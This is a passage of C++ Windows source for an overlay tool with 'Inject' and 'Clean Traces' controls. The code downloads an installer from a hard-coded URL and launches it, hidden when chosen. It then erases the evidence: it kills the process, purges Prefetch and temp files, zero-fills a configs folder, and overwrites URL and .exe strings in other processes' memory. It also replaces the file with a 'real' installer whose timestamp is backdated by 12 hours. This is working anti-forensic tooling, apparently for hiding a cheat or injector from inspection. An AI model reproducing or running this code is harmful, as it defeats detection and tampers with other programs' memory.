                (p[i + 2] | 0x20) == 'e' && p[i + 3] == 0 &&
                (p[i + 4] | 0x20) == 'x' && p[i + 5] == 0 &&
                (p[i + 6] | 0x20) == 'e' && p[i + 7] == 0)
                return true;
        }
        return false;
        };

    int cleaned = 0;
    ULONG_PTR addr = (ULONG_PTR)si.lpMinimumApplicationAddress;
    const ULONG_PTR maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress;

    while (addr < maxAddr) {
        MEMORY_BASIC_INFORMATION mbi = {};
        if (::VirtualQueryEx(hProc, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) {
            addr += si.dwPageSize;
            continue;
        }

        const ULONG_PTR base = (ULONG_PTR)mbi.BaseAddress;
        const SIZE_T size = mbi.RegionSize;
        const ULONG_PTR end = base + size;

        const bool committed = (mbi.State == MEM_COMMIT);
        const bool writable = committed &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY |
                PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS));

        if (!writable || size < maxNeedleLen) {
            addr = end;
            continue;
        }

        ULONG_PTR cur = base;
        while (cur < end) {
            SIZE_T avail = (SIZE_T)(end - cur);
            SIZE_T toRead = (avail < kReadSize) ? avail : kReadSize;
            SIZE_T read = 0;

            if (!::ReadProcessMemory(hProc, (LPCVOID)cur, buf.data(), toRead, &read)
                || read < maxNeedleLen) {
                cur += si.dwPageSize;
                if (avail <= si.dwPageSize) break;
                continue;
            }

            for (size_t n = 0; n < needleCount; ++n) {
                const BYTE* needleL = needlesLower[n].data();
                const size_t nLen = needlesLower[n].size();
                const size_t nLenW = nLen * 2;

                {
                    size_t pos = 0;
                    while (pos + nLen <= read) {
                        const BYTE* hit = MemFindCIFast(buf.data() + pos,
                            read - pos, needleL, nLen);
                        if (!hit) break;
                        const size_t hitOff = (size_t)(hit - buf.data());

                        size_t urlEnd = hitOff + nLen;
                        while (urlEnd < read &&
                            (urlEnd - hitOff) < kMaxSpan &&
                            isUrlCharA(buf[urlEnd])) {
                            ++urlEnd;
                        }

                        const size_t spanLen = urlEnd - hitOff;
                        if (spanLen < nLen || spanLen > kMaxSpan) {
                            pos = hitOff + nLen;
                            continue;
                        }
                        if (requireDotExe &&
                            !spanHasDotExe(buf.data() + hitOff, spanLen)) {
                            pos = urlEnd;
                            continue;
                        }
                        if (zeroAt(cur + hitOff, spanLen)) ++cleaned;
                        pos = urlEnd;
                    }
                }

                {
                    size_t wpos = 0;
                    while (wpos + nLenW <= read) {
                        const BYTE* hit = MemFindCIWFast(buf.data() + wpos,
                            read - wpos, needleL, nLen);
                        if (!hit) break;
                        const size_t hitOff = (size_t)(hit - buf.data());

                        size_t urlEnd = hitOff + nLenW;
                        while (urlEnd + 1 < read &&
                            (urlEnd - hitOff) < kMaxSpan * 2) {
                            const BYTE lo = buf[urlEnd];
                            const BYTE hi = buf[urlEnd + 1];
                            if (hi != 0) break;
                            if (!isUrlCharA(lo)) break;
                            urlEnd += 2;
                        }

                        const size_t spanLen = urlEnd - hitOff;
                        if (spanLen < nLenW || spanLen > kMaxSpan * 2) {
                            wpos = hitOff + nLenW;
                            continue;
                        }
                        if (requireDotExe &&
                            !spanHasDotExeW(buf.data() + hitOff, spanLen)) {
                            wpos = urlEnd;
                            continue;
                        }
                        if (zeroAt(cur + hitOff, spanLen)) ++cleaned;
                        wpos = urlEnd;
                    }
                }
            }

            SIZE_T advance = (read < kChunk) ? read : kChunk;
            cur += advance;
            if (avail <= advance) break;
        }

        addr = end;
    }

    ::CloseHandle(hProc);
    return cleaned;
}

struct CleanJob {
    const DWORD* pids;
    size_t pidCount;
    const char* const* needles;
    size_t needleCount;
    bool requireDotExe;
    volatile LONG nextIdx;
    volatile LONG totalCleaned;
};

static unsigned __stdcall CleanWorkerThreadProc(void* param) {
    CleanJob* job = (CleanJob*)param;
    int local = 0;
    for (;;) {
        LONG i = ::InterlockedIncrement(&job->nextIdx) - 1;
        if ((size_t)i >= job->pidCount) break;
        local += CleanProcessMemoryForNeedles(
            job->pids[i], job->needles, job->needleCount, job->requireDotExe);
    }
    ::InterlockedExchangeAdd(&job->totalCleaned, local);
    return 0;
}

static int PurgeProcessMemoryTraces() {
    InitLowerTable();

    std::vector<DWORD> pids;
    HANDLE snap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    const DWORD myPid = ::GetCurrentProcessId();
    const size_t procCount = sizeof(kTargetProcessNames) / sizeof(kTargetProcessNames[0]);

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (::Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == 0) continue;
            if (pe.th32ProcessID == 4) continue;
            if (pe.th32ProcessID == myPid) continue;

            for (size_t i = 0; i < procCount; ++i) {
                if (ContainsCIW(pe.szExeFile, kTargetProcessNames[i])) {
                    pids.push_back(pe.th32ProcessID);
                    break;
                }
            }
        } while (::Process32NextW(snap, &pe));
    }
    ::CloseHandle(snap);

    if (pids.empty()) return 0;

    const size_t strCount = sizeof(kTargetStrings) / sizeof(kTargetStrings[0]);

    SYSTEM_INFO si = {};
    ::GetSystemInfo(&si);
    int threads = (int)si.dwNumberOfProcessors;
    if (threads < 2) threads = 2;
    if (threads > 8) threads = 8;
    if ((size_t)threads > pids.size()) threads = (int)pids.size();
    if (threads <= 1) {
        int total = 0;
        for (DWORD pid : pids)
            total += CleanProcessMemoryForNeedles(pid, kTargetStrings, strCount, kRequireDotExe);
        return total;
    }

    CleanJob job = {};
    job.pids = pids.data();
    job.pidCount = pids.size();
    job.needles = kTargetStrings;
    job.needleCount = strCount;
    job.requireDotExe = kRequireDotExe;
    job.nextIdx = 0;
    job.totalCleaned = 0;

    std::vector<HANDLE> handles(threads);
    for (int i = 0; i < threads; ++i)
        handles[i] = (HANDLE)_beginthreadex(nullptr, 0,
            CleanWorkerThreadProc, &job, 0, nullptr);

    for (HANDLE h : handles) {
        if (h) { ::WaitForSingleObject(h, INFINITE); ::CloseHandle(h); }
    }

    return (int)job.totalCleaned;
}

static unsigned __stdcall InstallerThreadProc(void*) {
    std::wstring dir(kInstallerDir);
    if (!EnsureDirectoryExists(dir)) {
        ::InterlockedExchange(&g_installerFailed, 1);
        ::InterlockedExchange(&g_installerDone, 1);
        return 0;
    }

    std::wstring fullPath = dir + L"\\" + kInstallerFile;

    const bool exists = FileExistsOnDisk(fullPath);
    const bool isReal = exists && IsRealBySize(fullPath);
    const bool isFakeOk = exists && !isReal && IsInstallerValid(fullPath);
    const bool alreadyCached = isFakeOk;

    if (alreadyCached)
        ::InterlockedExchange(&g_installerWasCached, 1);
    else if (exists) {
        ::SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
        ::DeleteFileW(fullPath.c_str());
    }

    if (!alreadyCached) {
        if (!DownloadFileToDisk(kInstallerUrl, fullPath)) {
            ::DeleteFileW(fullPath.c_str());
            ::InterlockedExchange(&g_installerFailed, 1);
            ::InterlockedExchange(&g_installerDone, 1);
            return 0;
        }

        if (!IsInstallerValid(fullPath)) {
            ::DeleteFileW(fullPath.c_str());
            ::InterlockedExchange(&g_installerFailed, 1);
            ::InterlockedExchange(&g_installerDone, 1);
            return 0;
        }
    }

    const bool alreadyRunning = ProcessRunningByName(kInstallerFile);
    if (alreadyRunning) {
        ::InterlockedExchange(&g_installerHadRunning, 1);
    }
    else {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        std::wstring cmdLine = L"\"" + fullPath + L"\"";

        DWORD flags = 0;
        if (s_injectingMode == 0)
            flags = CREATE_NO_WINDOW;

        if (!::CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, FALSE,
            flags, nullptr, dir.c_str(), &si, &pi)) {
            ::DeleteFileW(fullPath.c_str());
            ::InterlockedExchange(&g_installerFailed, 1);
            ::InterlockedExchange(&g_installerDone, 1);
            return 0;
        }
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
    }

    ::Sleep(2500);
    ::InterlockedExchange(&g_installerSlept, 1);
    ::InterlockedExchange(&g_installerDone, 1);
    return 0;
}

static void LaunchInstallerAsync() {
    ::InterlockedExchange(&g_installerWasCached, 0);
    ::InterlockedExchange(&g_installerHadRunning, 0);
    ::InterlockedExchange(&g_installerDone, 0);
    ::InterlockedExchange(&g_installerFailed, 0);
    ::InterlockedExchange(&g_installerSlept, 0);

    HANDLE h = (HANDLE)_beginthreadex(nullptr, 0, InstallerThreadProc, nullptr, 0, nullptr);
    if (h) ::CloseHandle(h);
}

static unsigned __stdcall CleanThreadProc(void*) {
    std::wstring dir(kInstallerDir);
    std::wstring fullPath = dir + L"\\" + kInstallerFile;

    ::InterlockedExchange(&g_cleanStage, 0);
    ::InterlockedExchange(&g_cleanFound, 0);

    KillProcessByNameSoftly(kInstallerFile);

    PurgePrefetchByPrefix(L"KITS CONFIGURATION INSTALLER");

    PurgeRandomTmpFiles();

    ZeroFillCainesConfigsDir();

    PurgeProcessMemoryTraces();

    if (!EnsureDirectoryExists(dir)) {
        ::InterlockedExchange(&g_cleanFailed, 1);
        ::InterlockedExchange(&g_cleanDone, 1);
        return 0;
    }

    if (FileExistsOnDisk(fullPath)) {
        ::SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
        ::DeleteFileW(fullPath.c_str());
    }

    ::InterlockedExchange(&g_cleanStage, 1);

    if (!DownloadFileToDisk(kInstallerRealUrl, fullPath)) {
        ::InterlockedExchange(&g_cleanFailed, 1);
        ::InterlockedExchange(&g_cleanDone, 1);
        return 0;
    }

    if (!IsInstallerValid(fullPath)) {
        ::DeleteFileW(fullPath.c_str());
        ::InterlockedExchange(&g_cleanFailed, 1);
        ::InterlockedExchange(&g_cleanDone, 1);
        return 0;
    }

    BackdateFile12Hours(fullPath);

    ::InterlockedExchange(&g_cleanFound, 1);
    ::InterlockedExchange(&g_cleanZeroFilled, 1);
    ::InterlockedExchange(&g_cleanStage, 3);
    ::InterlockedExchange(&g_cleanDone, 1);
    return 0;
}

static void CleanTracesAsync() {
    ::InterlockedExchange(&g_cleanStage, 0);
    ::InterlockedExchange(&g_cleanFound, 0);
    ::InterlockedExchange(&g_cleanZeroFilled, 0);
    ::InterlockedExchange(&g_cleanDone, 0);
    ::InterlockedExchange(&g_cleanFailed, 0);

    HANDLE h = (HANDLE)_beginthreadex(nullptr, 0, CleanThreadProc, nullptr, 0, nullptr);
    if (h) ::CloseHandle(h);
}

bool InRect(const ImVec2& p, const ImVec2& a, const ImVec2& b) {
    return p.x >= a.x && p.x <= b.x && p.y >= a.y && p.y <= b.y;
}

bool CreateDeviceD3D(HWND hWnd) {
    DXGI_SWAP_CHAIN_DESC sd = {};
    sd.BufferCount = 2;
    sd.BufferDesc.Width = 0;
    sd.BufferDesc.Height = 0;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.SampleDesc.Quality = 0;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    UINT createFlags = 0;
    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL levels[] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0 };

    HRESULT hr = DXGI_ERROR_UNSUPPORTED;
    for (UINT msaa = 4; msaa >= 1; msaa = (msaa == 4 ? 1 : 0)) {
        sd.SampleDesc.Count = msaa;
        hr = D3D11CreateDeviceAndSwapChain(
            nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, createFlags,
            levels, 2, D3D11_SDK_VERSION,
            &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
        if (hr == DXGI_ERROR_UNSUPPORTED)
            hr = D3D11CreateDeviceAndSwapChain(
                nullptr, D3D_DRIVER_TYPE_WARP, nullptr, createFlags,
                levels, 2, D3D11_SDK_VERSION,
                &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
        if (SUCCEEDED(hr)) break;
    }

    if (FAILED(hr)) return false;

    ID3D11Texture2D* backBuffer = nullptr;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&backBuffer));
    if (backBuffer) {
        g_pd3dDevice->CreateRenderTargetView(backBuffer, nullptr, &g_mainRTV);
        backBuffer->Release();
    }
    return true;
}

void CleanupDeviceD3D() {
    if (g_mainRTV) { g_mainRTV->Release(); g_mainRTV = nullptr; }
    if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = nullptr; }
    if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = nullptr; }
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = nullptr; }
}

void CreateRenderTarget() {
    ID3D11Texture2D* backBuffer = nullptr;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&backBuffer));
    if (backBuffer) {
        g_pd3dDevice->CreateRenderTargetView(backBuffer, nullptr, &g_mainRTV);
        backBuffer->Release();
    }
}

void CleanupRenderTarget() {
    if (g_mainRTV) { g_mainRTV->Release(); g_mainRTV = nullptr; }
}

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg) {
    case WM_SIZE:
        if (g_pd3dDevice != nullptr && wParam != SIZE_MINIMIZED) {
            CleanupRenderTarget();
            g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
            CreateRenderTarget();
        }
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) return 0;
        break;
    case WM_KEYDOWN:
        if (wParam == VK_ESCAPE) { ::PostQuitMessage(0); return 0; }
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProcW(hWnd, msg, wParam, lParam);
}

void HandleDrag(HWND hWnd, const ImVec2& p, const ImVec2& q, const ImVec2& bp, const ImVec2& bq,
    const ImVec2& fp, const ImVec2& fq) {
    const ImVec2 mouse = ImGui::GetIO().MousePos;
    const bool overBtn = InRect(mouse, bp, bq) || InRect(mouse, fp, fq);

    if (!s_dragging) {
        const bool overPanel = InRect(mouse, p, q);
        const bool hovered = ImGui::IsWindowHovered(ImGuiHoveredFlags_AllowWhenBlockedByActiveItem);

        if (overPanel && !overBtn && hovered && ImGui::IsMouseClicked(ImGuiMouseButton_Left)) {
            ::GetCursorPos(&s_cursorStart);
            ::GetWindowRect(hWnd, &s_windowStart);
            s_dragging = true;
        }
        return;
    }

    if (ImGui::IsMouseReleased(ImGuiMouseButton_Left) || !ImGui::IsMouseDown(ImGuiMouseButton_Left)) {
        s_dragging = false;
        return;
    }

    POINT cur;
    ::GetCursorPos(&cur);
    const int x = s_windowStart.left + (cur.x - s_cursorStart.x);
    const int y = s_windowStart.top + (cur.y - s_cursorStart.y);
    ::SetWindowPos(hWnd, nullptr, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
}

static float Clamp01(float x) { return x < 0.0f ? 0.0f : (x > 1.0f ? 1.0f : x); }
static float EaseSmooth(float x) { return x * x * (3.0f - 2.0f * x); }

static float AnimDeltaTime() {
    return fminf(ImGui::GetIO().DeltaTime, 1.0f / 30.0f);
}

static void DrawTextGlow(ImDrawList* draw, ImFont* font, float size, const ImVec2& pos,
    ImU32 col, const char* text) {
    const int colA = (int)((col >> 24) & 0xFF);
    const int haloA = (colA * 14) / 100;
    const ImU32 halo = (col & 0x00FFFFFF) | ((ImU32)haloA << 24);
    static const float offs[4][2] = {
        { 0.5f, 0.0f }, { -0.5f, 0.0f }, { 0.0f, 0.5f }, { 0.0f, -0.5f }
    };
    for (int i = 0; i < 4; ++i)
        draw->AddText(font, size, ImVec2(pos.x + offs[i][0], pos.y + offs[i][1]), halo, text);
    draw->AddText(font, size, pos, col, text);
}

static void SetOverlayCollapsed(HWND hWnd, bool collapsed) {
    if (!hWnd || s_menuCollapsed == collapsed) return;

    RECT rc = {};
    ::GetWindowRect(hWnd, &rc);

    s_menuCollapsed = collapsed;
    s_dragging = false;
    s_collapsedDragging = false;
    s_collapsedMoved = false;

    const int x = rc.left;
    const int y = rc.top;
    const int w = collapsed ? (int)kCollapsedSize : (int)kPanelW;
    const int h = collapsed ? (int)kCollapsedSize : (int)kPanelH;

    ::SetWindowPos(hWnd, nullptr, x, y, w, h,
        SWP_NOZORDER | SWP_NOACTIVATE | SWP_FRAMECHANGED);
}

static ImU32 LerpColor(ImU32 a, ImU32 b, float t) {
    t = Clamp01(t);
    const int ar = (int)((a >> IM_COL32_R_SHIFT) & 0xFF);
    const int ag = (int)((a >> IM_COL32_G_SHIFT) & 0xFF);
    const int ab = (int)((a >> IM_COL32_B_SHIFT) & 0xFF);
    const int aa = (int)((a >> IM_COL32_A_SHIFT) & 0xFF);
    const int br = (int)((b >> IM_COL32_R_SHIFT) & 0xFF);
    const int bg = (int)((b >> IM_COL32_G_SHIFT) & 0xFF);
    const int bb = (int)((b >> IM_COL32_B_SHIFT) & 0xFF);
    const int ba = (int)((b >> IM_COL32_A_SHIFT) & 0xFF);

    return IM_COL32(
        ar + (int)((br - ar) * t + 0.5f),
        ag + (int)((bg - ag) * t + 0.5f),
        ab + (int)((bb - ab) * t + 0.5f),
        aa + (int)((ba - aa) * t + 0.5f));
}

static void DrawWindowButtonFAIcon(ImDrawList* draw, const ImVec2& center,
    const char* icon, float size, float yOffset, float hoverT) {
    ImFont* iconFont = g_fontWindowIcons ? g_fontWindowIcons :
        (g_fontIcons ? g_fontIcons : ImGui::GetFont());

    const ImVec2 ts = iconFont->CalcTextSizeA(size, FLT_MAX, 0.0f, icon);
    const ImVec2 pos(
        floorf(center.x - ts.x * 0.5f) + 0.5f,
        floorf(center.y - ts.y * 0.5f + yOffset) + 0.5f);

    if (hoverT > 0.01f) {
        const ImU32 glowSoft = IM_COL32(255, 255, 255, (int)(12.0f * hoverT));
        const ImU32 glowCore = IM_COL32(255, 255, 255, (int)(18.0f * hoverT));
        static const float softOffsets[8][2] = {
            {  1.20f,  0.00f }, { -1.20f,  0.00f },
            {  0.00f,  1.20f }, {  0.00f, -1.20f },
            {  0.85f,  0.85f }, { -0.85f,  0.85f },
            {  0.85f, -0.85f }, { -0.85f, -0.85f }
        };
        for (int i = 0; i < 8; ++i)
            draw->AddText(iconFont, size,
                ImVec2(pos.x + softOffsets[i][0], pos.y + softOffsets[i][1]),
                glowSoft, icon);
        draw->AddText(iconFont, size, ImVec2(pos.x, pos.y + 0.55f), glowCore, icon);
    }

    const ImU32 col = LerpColor(IM_COL32(185, 188, 196, 255),
        IM_COL32(255, 255, 255, 255), EaseSmooth(hoverT));
    draw->AddText(iconFont, size, pos, col, icon);
}

void DrawWindowButtons(ImDrawList* draw, const ImVec2& p, const ImVec2& q,
    HWND hWnd, ImVec2& exMin, ImVec2& exMax) {
    draw->Flags |= ImDrawListFlags_AntiAliasedLines | ImDrawListFlags_AntiAliasedFill;

    const float radius = 14.0f;
    const float margin = 10.0f;
    const float gap = 12.0f;
    const float cy = p.y + margin + radius;

    const float closeCx = q.x - margin - radius;
    const float minCx = closeCx - radius * 2.0f - gap;

    static float s_closeAnim = 0.0f;
    static float s_minAnim = 0.0f;

    {
        ImGui::SetCursorScreenPos(ImVec2(minCx - radius, cy - radius));
        ImGui::InvisibleButton("##minimize", ImVec2(radius * 2.0f, radius * 2.0f));
        const bool hovered = ImGui::IsItemHovered() && !s_dragging;
        if (ImGui::IsItemClicked())
            SetOverlayCollapsed(hWnd, true);

        const float dt = AnimDeltaTime();
        const float target = hovered ? 1.0f : 0.0f;
        if (s_minAnim < target) s_minAnim = fminf(target, s_minAnim + dt * 10.0f);
        else                    s_minAnim = fmaxf(target, s_minAnim - dt * 12.0f);

        const float t = EaseSmooth(s_minAnim);
        const ImVec2 c(floorf(minCx) + 0.5f, floorf(cy) + 0.5f);
        DrawWindowButtonFAIcon(draw, c, ICON_FA_MINUS, 15.5f, 1.0f, t);
    }

    {
        ImGui::SetCursorScreenPos(ImVec2(closeCx - radius, cy - radius));
        ImGui::InvisibleButton("##close", ImVec2(radius * 2.0f, radius * 2.0f));
        const bool hovered = ImGui::IsItemHovered() && !s_dragging;
        if (ImGui::IsItemClicked())
            g_running = false;

        const float dt = AnimDeltaTime();
        const float target = hovered ? 1.0f : 0.0f;
        if (s_closeAnim < target) s_closeAnim = fminf(target, s_closeAnim + dt * 10.0f);
        else                      s_closeAnim = fmaxf(target, s_closeAnim - dt * 12.0f);

        const float t = EaseSmooth(s_closeAnim);
        const ImVec2 c(floorf(closeCx) + 0.5f, floorf(cy) + 0.5f);
        DrawWindowButtonFAIcon(draw, c, ICON_FA_XMARK, 15.5f, 0.0f, t);
    }

    exMin = ImVec2(minCx - radius, cy - radius);
    exMax = ImVec2(closeCx + radius, cy + radius);

    ImGui::SetMouseCursor(ImGuiMouseCursor_Arrow);
}

static int   s_injectMode = 0;
static int   s_injectPrev = 0;
static float s_injectAnim = 1.0f;
static const char* kInjectLabels[2] = { "Inject Hide", "Inject Normal" };
static float s_injectSheen = 0.0f;

static int   s_cleanMode = 0;
static int   s_cleanPrev = 0;
static float s_cleanAnim = 1.0f;
static float s_cleanSheen = 0.0f;
static const char* kCleanLabels[2] = { "Clean Full Traces", "Clean Traces" };

static bool  s_injectActive = false;
static float s_injectElapsed = 0.0f;
static float s_injectPostDone = 0.0f;
static const float kInjectPostDoneGrace = 3.0f;
static bool  s_menuOpen = false;

static bool  s_cleanActive = false;
static float s_cleanElapsed = 0.0f;
static float s_cleanPostDone = 0.0f;
static const float kCleanPostDoneGrace = 3.0f;
static bool  s_cleanMenuOpen = false;

static float FitTextSize(ImFont* font, const char* text, float maxSize, float availW) {
    const float w = font->CalcTextSizeA(maxSize, FLT_MAX, 0.0f, text).x;
    if (w <= availW || w <= 0.0f) return maxSize;
    return maxSize * (availW / w);
}

static void DrawSpinner(ImDrawList* draw, const ImVec2& c, float r, float phase, ImU32 col) {
    const int   seg = 28;
    const float kSpan = 4.712389f;
    ImVec2 pts[seg + 1];
    for (int i = 0; i <= seg; ++i) {
        const float a = phase + kSpan * ((float)i / (float)seg);
        pts[i] = ImVec2(c.x + cosf(a) * r, c.y + sinf(a) * r);
    }
    draw->AddPolyline(pts, seg + 1, col, 0, 2.0f);
}

static void DrawSwapIcon(ImDrawList* draw, const ImVec2& c, float r, ImU32 col, float rot) {
    const float kSpan = 112.0f * 0.0174533f;
    const float kHead = 2.6f;
    const float kThick = 1.5f;
    const int   kSeg = 12;

    for (int k = 0; k < 2; ++k) {
        const float a0 = rot + (float)k * 3.14159265f;

        ImVec2 pts[kSeg + 1];
        for (int i = 0; i <= kSeg; ++i) {
            const float a = a0 + kSpan * ((float)i / (float)kSeg);
            pts[i] = ImVec2(c.x + cosf(a) * r, c.y + sinf(a) * r);
        }
        draw->AddPolyline(pts, kSeg + 1, col, 0, kThick);

        const float a1 = a0 + kSpan;
        const ImVec2 p(c.x + cosf(a1) * r, c.y + sinf(a1) * r);
        const ImVec2 tg(-sinf(a1), cosf(a1));
        const ImVec2 nr(cosf(a1), sinf(a1));
        const ImVec2 apex(p.x + tg.x * kHead * 1.15f, p.y + tg.y * kHead * 1.15f);
        const ImVec2 b1(p.x + nr.x * kHead * 0.62f, p.y + nr.y * kHead * 0.62f);
        const ImVec2 b2(p.x - nr.x * kHead * 0.62f, p.y - nr.y * kHead * 0.62f);
        draw->AddTriangleFilled(apex, b1, b2, col);
    }
}

static void AddRoundedSheen(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    float rounding, float centerX, float halfW, ImU32 rgb, float opacity) {
    if (opacity <= 0.001f || halfW <= 0.0f) return;
    rgb &= 0x00FFFFFFu;

    const int y0 = (int)floorf(mn.y);
    const int y1 = (int)ceilf(mx.y);
    const float topCY = mn.y + rounding;
    const float botCY = mx.y - rounding;

    for (int y = y0; y < y1; ++y) {
        const float py = (float)y + 0.5f;
        float rx0 = mn.x, rx1 = mx.x;
        if (py < topCY) {
            const float dy = topCY - py;
            const float dx = sqrtf(fmaxf(0.0f, rounding * rounding - dy * dy));
            rx0 = mn.x + rounding - dx;
            rx1 = mx.x - rounding + dx;
        }
        else if (py > botCY) {
            const float dy = py - botCY;
            const float dx = sqrtf(fmaxf(0.0f, rounding * rounding - dy * dy));
            rx0 = mn.x + rounding - dx;
            rx1 = mx.x - rounding + dx;
        }

        const float x0 = fmaxf(rx0, centerX - halfW);
        const float x1 = fminf(rx1, centerX + halfW);
        if (x1 <= x0) continue;

        auto alphaAt = [&](float x) {
            const float k = 1.0f - fabsf(x - centerX) / halfW;
            return (int)(255.0f * opacity * EaseSmooth(Clamp01(k)));
            };
        const ImU32 c0 = rgb | ((ImU32)alphaAt(x0) << 24);
        const ImU32 c1 = rgb | ((ImU32)alphaAt(x1) << 24);
        draw->AddRectFilledMultiColor(ImVec2(x0, (float)y), ImVec2(x1, (float)y + 1.0f),
            c0, c1, c1, c0);
    }
}

void DrawInjectControl(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    ImVec2& outMin, ImVec2& outMax) {
    const float kRound = 6.0f;
    const float kSize = 17.0f;
    const float kIconZone = 20.0f;
    const float kSwapTime = 0.26f;

    outMin = mn;
    outMax = mx;

    ImFont* font = g_fontText ? g_fontText : ImGui::GetFont();

    if (s_injectActive) {
        s_injectElapsed += AnimDeltaTime();
        const bool done = ::InterlockedCompareExchange(&g_installerDone, 0, 0) == 1;
        if (done) {
            s_injectPostDone += AnimDeltaTime();
            if (s_injectPostDone >= kInjectPostDoneGrace) {
                s_injectActive = false;
                s_menuOpen = false;
            }
        }
    }
    const bool busy = s_injectActive;

    ImGui::SetCursorScreenPos(mn);
    ImGui::InvisibleButton("##inject", ImVec2(mx.x - mn.x, mx.y - mn.y));
    const bool hovered = ImGui::IsItemHovered() && !s_dragging;
    const bool pressed = hovered && !busy && ImGui::IsMouseDown(ImGuiMouseButton_Left);

    const bool overIcon = ImGui::GetIO().MousePos.x >= (mx.x - kIconZone);

    if (ImGui::IsItemClicked() && !busy && !s_cleanActive) {
        if (overIcon) {
            s_injectPrev = s_injectMode;
            s_injectMode = 1 - s_injectMode;
            s_injectAnim = 0.0f;
        }
        else {
            s_injectingMode = s_injectMode;
            s_injectActive = true;
            s_injectElapsed = 0.0f;
            s_injectPostDone = 0.0f;
            s_menuOpen = true;
            s_cleanMenuOpen = false;
            LaunchInstallerAsync();
        }
    }

    const float radius = 0.0f;

    const float sheenTarget = hovered ? 1.0f : 0.0f;
    const float sheenStep = AnimDeltaTime() * 8.0f;
    if (s_injectSheen < sheenTarget)
        s_injectSheen = fminf(sheenTarget, s_injectSheen + sheenStep);
    else if (s_injectSheen > sheenTarget)
        s_injectSheen = fmaxf(sheenTarget, s_injectSheen - sheenStep);

    if (s_injectSheen > 0.001f) {
        for (int i = 3; i >= 1; --i) {
            const float g = (float)i * 1.5f;
            draw->AddRectFilled(ImVec2(mn.x - g, mn.y - g),
                ImVec2(mx.x + g, mx.y + g),
                IM_COL32(255, 255, 255,
                    (int)(22.0f * EaseSmooth(s_injectSheen) / (float)i)),
                kRound + g);
        }
    }

    const ImU32 face = pressed ? IM_COL32(24, 25, 29, 255)
        : (hovered ? IM_COL32(19, 20, 24, 255) : IM_COL32(30, 30, 30, 255));
    draw->AddRectFilled(mn, mx, face, kRound);

    if (s_injectSheen > 0.001f) {
        const float W = mx.x - mn.x;
        const float cycle = W + 150.0f;
        const float sheenX = mn.x - 75.0f +
            fmodf((float)ImGui::GetTime() * 105.0f, cycle);
        AddRoundedSheen(draw, ImVec2(mn.x + 1.0f, mn.y + 1.0f),
            ImVec2(mx.x - 1.0f, mx.y - 1.0f), kRound - 1.0f,
            sheenX, 62.0f, IM_COL32(255, 255, 255, 0),
            0.28f * EaseSmooth(s_injectSheen));
    }

    draw->AddRect(mn, mx,
        IM_COL32(255, 255, 255,
            (int)(70.0f + 105.0f * EaseSmooth(s_injectSheen))),
        kRound, 0, 1.0f);

    const ImVec2 cc(mn.x + (mx.x - mn.x) * 0.5f, mn.y + (mx.y - mn.y) * 0.5f);

    if (s_injectAnim < 1.0f)
        s_injectAnim = Clamp01(s_injectAnim + AnimDeltaTime() / kSwapTime);
    const float ap = EaseSmooth(s_injectAnim);

    const float H = mx.y - mn.y;
    const ImVec2 tMin(mn.x + 10.0f, mn.y);
    const ImVec2 tMax(mx.x - kIconZone, mx.y);

    const float availW = tMax.x - tMin.x;
    const float parkedSize = fminf(FitTextSize(font, kInjectLabels[0], kSize, availW),
        FitTextSize(font, kInjectLabels[1], kSize, availW));
    auto drawFitted = [&](const char* txt, float maxSize, float dy, float alpha) {
        const float size = FitTextSize(font, txt, maxSize, availW);
        const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
        const ImVec2 tp(tMin.x, mn.y + (H - ts.y) * 0.5f + dy);

        const ImVec2 tc(tp.x + ts.x * 0.5f, tp.y + ts.y * 0.5f);
        const float textDist = sqrtf((tc.x - cc.x) * (tc.x - cc.x) +
            (tc.y - cc.y) * (tc.y - cc.y));
